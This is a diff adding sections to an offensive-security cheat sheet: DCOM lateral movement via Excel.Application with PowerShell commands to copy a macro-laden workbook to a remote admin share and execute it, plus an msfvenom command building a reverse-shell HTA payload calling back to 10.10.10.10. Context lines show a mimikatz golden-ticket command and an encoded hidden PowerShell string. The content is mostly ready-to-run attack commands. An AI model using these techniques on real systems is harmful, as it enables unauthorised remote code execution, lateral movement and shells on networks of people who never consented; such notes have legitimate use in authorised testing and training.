@@ -1023,6 +1023,56 @@ mimikatz # kerberos::golden /user:user /domain:domain.com /sid:s-1-5-21-16028755
 ```
 where /rc4 is the hash
 
+## Lateral Movement with Distributed Component Object Model (DCOM)
+The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.
+
+Discover available methods from a DCOM object. In this example Excel.
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+
+$com | Get-Member
+```
+This script revealed the 'Run' method which allows to execute Visual Basic for Applications (VBA) remotely
+POC macro:
+```
+Sub mymacro()
+    Shell ("notepad.exe")
+End Sub
+```
+Save to an Excel file and copy to target
+```
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+```
+The Excel application is instantiated through DCOM with SYSTEM account. This account does not have a profile, which is used as part of the opening process.
+To fix this, simply create the Desktop folder at ``C:\Windows\SysWOW64\config\systemprofile``
+```
+$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+$temp = [system.io.directory]::createDirectory($Path)
+```
+Call the 'Run' method on our Excel file
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "10.10.10.10"))
+
+$LocalPath = "C:\Users\dummy_admin.corp\myexcel.xls"
+
+$RemotePath = "\\10.10.10.10\c$\myexcel.xls"
+
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+$temp = [system.io.directory]::createDirectory($Path)
+
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+
+$com.Run("mymacro")
+```
+
 ## Shell Access Whith NTLM Hash
 
 ```
@@ -2666,6 +2716,10 @@ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-p
 ```
 
 ### Exploiting Microsoft Office
+Create payload:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta
+```
 Since VBA has a 255-character limit for literal strings we need to split the command we want to execute into multiple lines
 ```
 str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
